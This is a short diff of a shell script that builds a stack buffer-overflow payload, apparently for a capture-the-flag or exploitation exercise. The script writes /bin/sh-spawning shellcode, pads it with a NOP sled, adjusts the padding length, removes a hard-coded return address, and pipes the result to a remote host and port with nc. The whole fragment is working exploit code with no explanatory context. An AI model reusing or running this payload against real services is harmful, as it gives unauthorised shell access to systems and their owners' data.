@@ -13,11 +13,10 @@ shellcode="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\
 echo -ne $shellcode > payload_5
 shellcodeLen=$(wc -c < payload_5)
 
-nopLen=$((200 - shellcodeLen))
+# nopLen=$((200 - shellcodeLen))
+nopLen=$((200 - shellcodeLen - 145))
 nopSeq=$(printf "\x90%.0s" $(seq 1 $nopLen))
 
-jumpto="\xb0\xe3\xff\xff\xff\x7f\x00\x00"
-
-echo -ne $nopSeq$shellcode$jumpto > payload_5
+echo -ne $nopSeq$shellcode > payload_5
 
 cat payload_5 - | nc $host $port
